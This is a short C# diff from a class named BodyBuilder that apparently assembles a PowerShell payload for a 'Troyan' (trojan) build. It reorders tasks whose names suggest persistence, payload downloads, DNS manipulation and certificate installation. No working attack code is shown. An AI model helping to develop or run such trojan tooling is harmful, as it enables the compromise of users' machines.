@@ -14,7 +14,7 @@ public sealed class BodyBuilder : CustomBuilder
 
     protected override string OutputFile => Mode == TroyanBuildMode.Debug ? L.BodyPs1Debug : L.BodyPs1;
 
-    protected override string[] PriorityTasks => new[] { "autorun", "autoregistry", "autostuff", "startdownloads", "dnsman", "cert" };
+    protected override string[] PriorityTasks => new[] { "autostuff", "autoregistry", "startdownloads", "dnsman", "cert", "autorun" };
     protected override string[] UnpriorityTasks => new[] { "extraupdate", "autoupdate" };
     protected override string EntryPoint => "program";
 
